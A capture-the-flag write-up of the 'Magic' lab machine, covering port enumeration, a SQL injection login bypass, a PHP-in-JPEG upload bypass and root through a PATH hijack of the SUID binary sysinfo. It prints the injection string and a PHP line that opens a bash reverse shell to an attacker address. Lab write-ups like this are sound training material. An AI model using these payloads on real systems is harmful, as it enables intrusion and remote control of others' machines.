# Magic Writeup
## Enumeration:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
So we have SSH and a web server. Checking out the webserver shows a site with a few images, a login button, and most importantly: a message that says "log in to upload files". Automatically this gives us a pretty good map of what we have to do:
`Find a way to log in -> use a file upload vulnerability to gain a reverse shell -> Local Privesc`
#
# Initial Compromise
#
Playing around with the login form shows its vulnerable to very basic SQLi on both the username and password parameters of the login POST request:
```
User: MILI' OR '1'='1' -- 
Password: MILI' OR '1'='1' -- 
```
So now, we've gained access to the file upload part. Attempting to upload a blank file tells us that only JPG, JPEG, and PNG images are allowed. My payload for this is a simple PHP reverse shell. Renaming it to `rshell.php.jpg` returns a popup saying "what were you trying to do there"... interesting. I attempted looking at the MIME type in the request for `rshell.php.jpg`, but it's `image/jpeg` meaning that our roadblock lies elsewhere.

So what I know:
1) Extensions are checked, and can be bypassed by renaming the files
2) The file contents are checked somehow, but changing MIME type in the request does not help

I tried embedding php into the Description tag of a jpeg file, with `<?php echo shell_exec('bash -i >& /dev/tcp/10.10.14.120/7777 0>&1'); ?>` as a payload, which resulted in the code being displayed upon accessing the image, but not executed.

After a long, long struggle I finally got code execution by embedding a simple php shell into a normal JPG after the magic bytes. After another 15 minutes struggling with a reverse connection, I finally had a shell as `www-data`
#
# Privilege Escalation
#
Now I need the privileges to read `/home/theseus/user.txt`, naturally I want to see if I can become `theseus` before I jump straight to root. Looking around the web server files reveals a file called `db.php5`, and inside is contained a password. I tried to `su theseus`, but it wasn't the right password. Since the file connects to a db, I tried dumping the MYSQL database and see if there were any passwords in there, and sure enough there was a login for admin with a different password. Now, all we have to do is escalate to root.

Since I saw a lot of SUID scripts floating around the box, I started testing there and quickly found `/bin/sysinfo`. This meant all I had to do was make a fake `lshw` file containing a python reverse shell back to a different port on my machine, add the directory I was working from to `PATH`, and run sysinfo.

As expected, I got a connection and could simple do `cat /root/root.txt`
